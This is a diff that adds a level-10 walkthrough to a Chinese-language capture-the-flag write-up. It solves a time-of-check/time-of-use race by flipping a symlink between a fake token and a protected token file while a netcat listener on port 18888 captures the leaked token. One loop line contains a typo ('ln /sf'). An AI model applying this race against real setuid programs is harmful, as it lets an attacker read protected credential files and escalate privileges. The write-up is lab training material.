@@ -64,5 +64,43 @@ attack-php
 ![](img/level09.png)
 
 
+### level10
+
+race-conf-vuln
+
+TOCTOU（time of check，time of use）问题
+程序先根据uid判断是否有读取权限，如果有，才能继续执行，破解方法是先打开一个当前用户有权限的程序，再对打开的内容进行更改；程序输出在18888端口
+
+窗口1：
+监听18888端口
+`nc -k -l 127.0.0.1 18888`
+
+窗口2：
+新建一个窗口，在/tmp目录下创建token文件，作为有权限打开的假token文件；创建一个可执行文件xx，执行循环：
+```
+while true
+do
+    ln -sf /tmp/token /tmp/token10
+    ln /sf /home/flag10/token /tmp/token10
+done
+```
+执行命令
+`chmod +x xx;./xx`
+
+窗口3：
+新建一个窗口，在/tmp目录下创建一个可执行文件yy，执行循环：
+```
+while true
+do
+    nice -n 19 /home/flag10/flag10 /tmp/token10 127.0.0.1
+done
+```
+
+在窗口一中获得flag10的token：`b3c5-6d82-7sfc`
+登录，获取flag
+![](img/level10.png)
+
+
+
 
 
